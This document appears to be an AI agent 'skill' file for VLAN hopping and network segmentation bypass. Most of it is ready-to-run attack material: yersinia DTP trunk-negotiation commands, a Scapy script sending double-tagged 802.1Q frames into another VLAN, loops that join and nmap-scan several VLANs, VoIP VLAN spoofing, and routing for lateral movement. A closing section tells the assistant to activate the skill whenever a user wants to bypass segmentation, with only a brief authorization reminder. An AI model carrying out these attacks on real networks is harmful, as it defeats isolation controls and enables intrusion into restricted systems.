# VLAN Hopping and Segmentation Bypass Skill

## Goal

Bypass network segmentation controls by exploiting VLAN misconfigurations to access restricted network segments.

## Methodology

1. **Reconnaissance**: Identify VLAN configuration and trunk ports
2. **DTP Attack**: Exploit Dynamic Trunking Protocol to negotiate trunk link
3. **Double Tagging**: Use nested 802.1Q tags to reach non-native VLANs
4. **VLAN Hopping**: Pivot between VLANs to access segmented networks
5. **Lateral Movement**: Access systems in previously unreachable segments

## Background

VLANs provide Layer 2 network segmentation, but can be bypassed through:
- **Switch Spoofing**: Becoming a trunk port via DTP negotiation
- **Double Tagging**: Exploiting native VLAN handling to inject packets into other VLANs
- **Misconfigured Trunks**: Finding trunk ports that allow all VLANs

## Tools

* **yersinia**: Layer 2 attack framework (DTP, STP, CDP, DHCP)
* **frogger**: VLAN hopping tool
* **Scapy**: Craft custom 802.1Q packets
* **nmap**: Network discovery across VLANs

## Example Commands

```bash
# DTP Attack with Yersinia - Enable trunk mode
yersinia dtp -attack 1 -interface eth0

# Yersinia interactive mode
yersinia -I
# Select DTP and launch attack

# Yersinia graphical mode
yersinia -G

# Using frogger for VLAN hopping
./frogger.sh

# Create VLAN interface after becoming trunk
modprobe 8021q
vconfig add eth0 20
ifconfig eth0.20 192.168.20.100 netmask 255.255.255.0 up

# Or using ip command
ip link add link eth0 name eth0.20 type vlan id 20
ip addr add 192.168.20.100/24 dev eth0.20
ip link set eth0.20 up
```

## Double Tagging Attack

```python
#!/usr/bin/env python3
# Double tagging attack with Scapy
from scapy.all import *

# Target in VLAN 20, attacker in native VLAN 1
target_ip = "192.168.20.100"
target_mac = "aa:bb:cc:dd:ee:ff"  # or use ff:ff:ff:ff:ff:ff

# Create double-tagged frame
# Outer tag (native VLAN) is stripped by first switch
# Inner tag (target VLAN) is forwarded
packet = Ether(dst=target_mac)/\
         Dot1Q(vlan=1)/\
         Dot1Q(vlan=20)/\
         IP(dst=target_ip)/\
         ICMP()

sendp(packet, iface="eth0")

# Double-tagged ARP request
arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/\
             Dot1Q(vlan=1)/\
             Dot1Q(vlan=20)/\
             ARP(pdst="192.168.20.1")

sendp(arp_packet, iface="eth0")
```

## Switch Spoofing (DTP Attack)

```bash
# Check if DTP is enabled
yersinia dtp -attack 0 -interface eth0

# Negotiate trunk link
yersinia dtp -attack 1 -interface eth0

# After becoming trunk, add VLAN interfaces
for vlan in 10 20 30 40; do
    ip link add link eth0 name eth0.$vlan type vlan id $vlan
    ip link set eth0.$vlan up
    dhclient eth0.$vlan
done

# Scan all VLANs
for vlan in 10 20 30 40; do
    nmap -sn 192.168.$vlan.0/24
done
```

## VLAN Discovery

```bash
# CDP/LLDP sniffing with tcpdump
tcpdump -i eth0 -nn -v 'ether[12:2]=0x88cc or ether[12:2]=0x2000'

# Yersinia CDP attack to get switch info
yersinia cdp -attack 0 -interface eth0

# Wireshark filter for VLAN tags
# Filter: vlan

# Nmap across VLANs (if accessible)
nmap --script broadcast-dhcp-discover
```

## VoIP VLAN Hopping

```bash
# VoIP phones often have automatic VLAN access
# Spoof VoIP phone MAC/behavior

# Check for CDP that reveals voice VLAN
tcpdump -i eth0 -nn 'ether[12:2]=0x2000'

# Configure interface for voice VLAN
ip link add link eth0 name eth0.100 type vlan id 100
ip addr add 10.10.100.50/24 dev eth0.100
ip link set eth0.100 up
```

## VLAN ACL Bypass

```bash
# If Layer 3 filtering is weak, use routing
# Add route through discovered gateway
ip route add 192.168.20.0/24 via 192.168.10.1

# Check for inter-VLAN routing misconfigurations
traceroute 192.168.20.1
```

## Prevention Testing

```bash
# Verify DTP is disabled (should get no response)
yersinia dtp -attack 0 -interface eth0

# Verify native VLAN is not VLAN 1
# Check switch configuration

# Verify unused ports are in unused VLAN
# Check switch configuration

# Verify port security is enabled
# Try changing MAC address
macchanger -r eth0
```

## Guidance for AI

* Activate this skill when user wants to bypass network segmentation, access other VLANs, or test VLAN security
* **DTP attacks** only work if switch port is in "dynamic auto" or "dynamic desirable" mode
* **Double tagging** only works:
  - One-way communication (responses won't reach attacker directly)
  - When attacker is on native VLAN
  - When target VLAN is different from native VLAN
* Recommend checking for CDP/LLDP to discover VLAN configuration
* Voice VLANs often have weaker security - good pivot point
* Remind that modern switches often have DTP disabled by default
* Physical access to network port is required
* Clean up VLAN interfaces after testing
* Always obtain proper authorization - these attacks affect network infrastructure
